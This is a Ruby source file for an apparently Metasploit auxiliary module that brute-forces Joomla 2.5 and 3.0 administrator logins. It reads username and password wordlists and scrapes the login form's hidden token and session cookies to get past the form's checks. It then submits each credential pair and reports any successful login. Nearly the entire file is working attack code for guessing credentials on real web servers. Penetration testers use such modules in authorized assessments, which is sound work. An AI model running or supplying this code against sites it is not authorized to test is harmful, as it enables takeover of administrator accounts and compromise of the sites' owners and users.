##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex/proto/ntlm/message'


class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'           => 'Joomla Bruteforce Login Utility',
      'Description'    => 'This module attempts to authenticate to Joomla 2.5. or 3.0 through bruteforce attacks',
      'Author'         => 'luisco100[at]gmail.com',
      'References'     =>
        [
          ['CVE', '1999-0502'] # Weak password Joomla
        ],
      'License'        => MSF_LICENSE
    )

    register_options(
      [
        OptPath.new('USERPASS_FILE',  [ false, "File containing users and passwords separated by space, one pair per line",
          File.join(Msf::Config.data_directory, "wordlists", "http_default_userpass.txt") ]),
        OptPath.new('USER_FILE',  [ false, "File containing users, one per line",
          File.join(Msf::Config.data_directory, "wordlists", "http_default_users.txt") ]),
        OptPath.new('PASS_FILE',  [ false, "File containing passwords, one per line",
          File.join(Msf::Config.data_directory, "wordlists", "http_default_pass.txt") ]),
        OptString.new('AUTH_URI', [ true, "The URI to authenticate against", "/administrator/index.php" ]),
        OptString.new('FORM_URI', [ false, "The FORM URI to authenticate against" , "/administrator"]),
        OptString.new('USER_VARIABLE', [ false, "The name of the variable for the user field", "username"]),
        OptString.new('PASS_VARIABLE', [ false, "The name of the variable for the password field" , "passwd"]),
        OptString.new('WORD_ERROR', [ false, "The word of message for detect that login fail","mod-login-username"]),
        OptString.new('REQUEST_TYPE', [ false, "Use HTTP-GET or HTTP-PUT for Digest-Auth, PROPFIND for WebDAV (default:GET)", "POST" ]),
        OptString.new('UserAgent', [ true, 'The HTTP User-Agent sent in the request', 'Mozilla/5.0 (X11; Linux i686; rv:24.0) Gecko/20140319 Firefox/24.0 Iceweasel/24.4.0' ]),
      ], self.class)

    register_autofilter_ports([80, 443])
  end

  def find_auth_uri

    if datastore['AUTH_URI'] && datastore['AUTH_URI'].length > 0
      paths = [datastore['AUTH_URI']]
    else
      paths = %W{
        /
        /administrator/
      }
    end

    paths.each do |path|
      res = send_request_cgi({
        'uri'     => path,
        'method'  => 'GET'
      })

      next unless res
      if res.code == 301 || res.code == 302 && res.headers['Location'] && res.headers['Location'] !~ /^http/
        path = res.headers['Location']
        vprint_status("Following redirect: #{path}")
        res = send_request_cgi({
          'uri'     => path,
          'method'  => 'GET'
        })
        next unless res
      end

      return path
    end

    return nil
  end

  def target_url
    proto = "http"
    if rport == 443 || ssl
      proto = "https"
    end
    "#{proto}://#{rhost}:#{rport}#{@uri.to_s}"
  end

  def run_host(ip)

    @uri = find_auth_uri

    if ! @uri
      print_error("#{target_url} No URI found that asks for HTTP authentication")
      return
    end

    @uri = "/#{@uri}" if @uri[0,1] != "/"

    print_status("Attempting to login to #{target_url}")

    each_user_pass { |user, pass|
      do_login(user, pass)
    }
  end

  def do_login(user='admin', pass='admin')
    vprint_status("#{target_url} - Trying username:'#{user}' with password:'#{pass}'")

    response  = do_http_login(user,pass)
    result = determine_result(response)

    if result == :success
      print_good("#{target_url} - Successful login '#{user}' : '#{pass}'")
      return :abort if (datastore['STOP_ON_SUCCESS'])
      return :next_user
    else
      vprint_error("#{target_url} - Failed to login as '#{user}'")
      return
    end
  end

  def do_http_login(user,pass)

    @uri_mod = @uri

    if datastore['REQUEST_TYPE'] == "GET"

      @uri_mod = "#{@uri}?username=#{user}&psd=#{pass}"

        begin
          response = send_request_cgi({
            'uri' => @uri_mod,
            'method' => datastore['REQUEST_TYPE'],
            'username' => user,
            'password' => pass
          })
          return response
        rescue ::Rex::ConnectionError
          vprint_error("#{target_url} - Failed to connect to the web server")
          return nil
      end
    else

      begin

        user_var = datastore['USER_VARIABLE']
        pass_var = datastore['PASS_VARIABLE']

        referer_var = "http://#{rhost}/administrator/index.php"
        ctype = 'application/x-www-form-urlencoded'

        uid, cval, hidden_value = get_login_cookie

        if uid
          index_cookie = 0
          value_cookie = ""

          uid.each do |val_uid|
            value_cookie = value_cookie + "#{val_uid.strip}=#{cval[index_cookie].strip};"
            index_cookie = index_cookie +1
          end

          value_cookie = value_cookie
          vprint_status("Target #{target_url},Value of cookie ( #{value_cookie} ), Hidden ( #{hidden_value}=1 )")

          data  = "#{user_var}=#{user}&" \
                  "#{pass_var}=#{pass}&" \
                  "lang=&" \
                  "option=com_login&" \
                  "task=login&" \
                  "return=aW5kZXgucGhw&" \
                  "#{hidden_value}=1"

          response = send_request_cgi({
            'uri' => @uri_mod,
            'method' => datastore['REQUEST_TYPE'],
            'cookie' => "#{value_cookie}",
            'data' => data,
            'headers' =>
              {
                'Content-Type'    => ctype,
                'Referer' => referer_var,
                'User-Agent' => datastore['UserAgent'],
              }
          })

          vprint_status("#{target_url} -> First Response Code : #{response.code}")

          if (response.code == 301 || response.code == 302 || response.code == 303) && response.headers['Location']

            path = response.headers['Location']
            print_status("Following redirect Response: #{path}")

            response = send_request_raw({
              'uri'     => path,
              'method'  => 'GET',
              'cookie' => "#{value_cookie}"
            })
          end

          return response
        else
          print_error("#{target_url} - Failed to get Cookies")
          return nil
        end
        rescue ::Rex::ConnectionError
          vprint_error("#{target_url} - Failed to connect to the web server")
        return nil
      end
    end
  end

  def determine_result(response)

    return :abort unless response.kind_of? Rex::Proto::Http::Response
    return :abort unless response.code

    if [200, 301, 302].include?(response.code)

      #print_status("Response Code: #{response.body}")

      if response.to_s.include? datastore['WORD_ERROR']
        return :fail
      else
        return :success
      end

    end
    return :fail
  end

  def get_login_cookie

    uri = normalize_uri(datastore['FORM_URI'])
    uid = Array.new
    cval = Array.new
    valor_input_id  = ''

    res = send_request_cgi({'uri' => uri, 'method' => 'GET'})

    if(res.code == 301)
      path = res.headers['Location']
      vprint_status("Following redirect: #{path}")
      res = send_request_cgi({
        'uri'     => path,
        'method'  => 'GET'
      })
    end

    #print_status("Response Get login cookie: #{res.to_s}")

    if res && res.code == 200 && res.headers['Set-Cookie']
      #Identify login form and get the session variable validation of Joomla
      if res.body && res.body =~ /<form action=([^\>]+)\>(.*)<\/form>/mi

        form = res.body.split(/<form action=([^\>]+) method="post" id="form-login"\>(.*)<\/form>/mi)

        if form.length == 1  #is not Joomla 2.5
          print_error("Testing Form Joomla 3.0")
          form = res.body.split(/<form action=([^\>]+) method="post" id="form-login" class="form-inline"\>(.*)<\/form>/mi)
        end

        unless form
          print_error("Joomla Form Not Found")
          form = res.body.split(/<form id="login-form" action=([^\>]+)\>(.*)<\/form>/mi)
        end

        input_hidden = form[2].split(/<input type="hidden"([^\>]+)\/>/mi)

        print_status("--------> Joomla Form Found <--------")

        input_id = input_hidden[7].split("\"")

        valor_input_id = input_id[1]
      end

      #Get the name of the cookie variable Joomla

      #print_status("cookie = #{res.headers['Set-Cookie']}")
      res.headers['Set-Cookie'].split(';').each {|c|
          if c.split('=')[0].length > 10
            uid.push(c.split('=')[0])
            cval.push(c.split('=')[1])
          end
      }
      return uid, cval, valor_input_id.strip
    end
    return nil
  end
end
